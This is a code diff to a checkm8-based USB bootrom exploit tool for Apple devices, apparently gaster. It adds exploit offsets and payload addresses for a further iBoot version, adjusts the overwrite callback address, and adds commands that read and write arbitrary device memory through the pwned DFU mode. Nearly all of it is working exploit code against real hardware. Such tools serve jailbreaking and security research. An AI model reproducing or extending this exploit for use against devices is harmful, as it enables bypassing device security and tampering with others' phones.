@@ -546,6 +546,21 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x81A1;
 			usb_create_string_descriptor = 0x7C95;
 			usb_serial_number_string_descriptor = 0x100600D8;
+		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1413.8]") != NULL) {
+			cpid = 0x8747;
+			config_large_leak = 41;
+			config_overwrite_pad = 0x760;
+			memcpy_addr = 0x8f50;
+			aes_crypto_cmd = 0x6541;
+			gUSBSerialNumber = 0x2201A718;
+			dfu_handle_request = 0x2201A250;// PAYLOAD_PTR
+			payload_dest_armv7 = 0x2201C800; //PAYLOAD_DEST
+			usb_core_do_transfer = 0x6f2d;
+			dfu_handle_bus_reset = dfu_handle_request+0x44;//?
+			insecure_memory_base = 0x22000000;
+			handle_interface_request = 0x70f5;
+			usb_create_string_descriptor = 0x67d1;
+			usb_serial_number_string_descriptor = 0x2201A19C;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1458.2]") != NULL) {
 			cpid = 0x8947;
 			config_large_leak = 626;
@@ -1204,7 +1219,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				}
 			} else {
 				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
-				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
+				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base+0x300;
 				overwrite = &checkm8_overwrite_armv7;
 				overwrite_sz = sizeof(checkm8_overwrite_armv7);
 			}
@@ -1596,6 +1611,87 @@ gaster_decrypt_kbag(usb_handle_t *handle, const char *kbag_str) {
 }
 
 static bool
+gaster_readmem(usb_handle_t *handle, const char *addr_str) {
+	uint64_t addr = strtoull(addr_str, NULL, 16);
+	size_t len = 16;
+	uint8_t data[DFU_MAX_TRANSFER_SZ], *response;
+	struct {
+		uint64_t magic, pad, dst, src, len;
+	} exec_cmd;
+	size_t data_sz;
+	uint64_t r;
+
+	gaster_checkm8(handle);
+	exec_cmd.magic = MEMC_MAGIC;
+	exec_cmd.pad = 0;
+	exec_cmd.dst = insecure_memory_base + 16;
+	exec_cmd.src = addr;
+	exec_cmd.len = len;
+
+	memcpy(data, &exec_cmd, sizeof(exec_cmd));
+	data_sz = sizeof(exec_cmd);
+		if(gaster_command(handle, data, data_sz, &response, len + 2 * sizeof(r))) {
+		memcpy(&r, response, sizeof(r));
+		if(r != DONE_MAGIC) {
+			printf("[-]gaster_readmem response[0] is not DONE_MAGIC, which is %llx\n", r);
+			free(response);
+			return false;
+		}
+		memcpy(&r, response + sizeof(r), sizeof(r));
+		printf("[+]gaster_readmem response[1] (dest) is %llx\n", r);
+		//memcpy(dst, response + 2 * sizeof(r), len);
+		for(size_t i=2; i < len/8+2; i++){
+			memcpy(&r, response + i * sizeof(r), sizeof(r));
+			printf("[+]gaster_readmem response[%zd] is %llx\n", i, r);
+		}
+		free(response);
+		return true;
+	}
+	return false;
+}
+
+static bool
+gaster_writemem(usb_handle_t *handle, const char *addr_str, const char* value_str) {
+	uint64_t addr = strtoull(addr_str, NULL, 16);
+	uint64_t value = strtoull(value_str, NULL, 16);
+	size_t len = 8;
+	uint8_t data[DFU_MAX_TRANSFER_SZ], *response;
+	struct {
+		uint64_t magic, pad, dst, src, len, value;
+	} exec_cmd;
+	size_t data_sz;
+	uint64_t r;
+
+	gaster_checkm8(handle);
+	exec_cmd.magic = MEMC_MAGIC;
+	exec_cmd.pad = 0;
+	exec_cmd.dst = addr;
+	exec_cmd.src = insecure_memory_base + 16 + 3 * sizeof(r);
+	exec_cmd.len = len;
+	exec_cmd.value = value;
+
+	memcpy(data, &exec_cmd, sizeof(exec_cmd));
+	data_sz = sizeof(exec_cmd);
+		if(gaster_command(handle, data, data_sz, &response, len + 2 * sizeof(r))) {
+		memcpy(&r, response, sizeof(r));
+		if(r != DONE_MAGIC) {
+			printf("[-]gaster_writemem response[0] is not DONE_MAGIC, which is %llx\n", r);
+			free(response);
+			return false;
+		}
+		memcpy(&r, response + sizeof(r), sizeof(r));
+		printf("[+]gaster_writemem response[1] (dest) is %llx\n", r);
+		//memcpy(dst, response + 2 * sizeof(r), len);
+		memcpy(&r, response + 2 * sizeof(r), sizeof(r));
+		printf("[+]gaster_writemem response[2] is %llx\n", r);
+		free(response);
+		return true;
+	}
+	return false;
+}
+
+
+static bool
 gaster_decrypt_file(usb_handle_t *handle, const char *src_filename, const char *dst_filename) {
 	uint8_t *buf, *dec;
 	size_t len, dec_sz;
@@ -1657,6 +1753,14 @@ main(int argc, char **argv) {
 		if(gaster_decrypt_kbag(&handle, argv[2])) {
 			ret = 0;
 		}
+	} else if(argc == 3 && strcmp(argv[1], "readmem") == 0) {
+		if(gaster_readmem(&handle, argv[2])) {
+			ret = 0;
+		}
+	} else if(argc == 4 && strcmp(argv[1], "writemem") == 0) {
+		if(gaster_writemem(&handle, argv[2], argv[3])) {
+			ret = 0;
+		}
 	} else {
 		printf("Usage: env %s options\n", argv[0]);
 		puts("env:");
@@ -1667,6 +1771,8 @@ main(int argc, char **argv) {
 		puts("pwn - Put the device in pwned DFU mode");
 		puts("decrypt src dst - Decrypt file using GID0 AES key");
 		puts("decrypt_kbag kbag - Decrypt KBAG using GID0 AES key");
+		puts("readmem addr");
+		puts("writemem addr value");
 	}
 	return ret;
 }
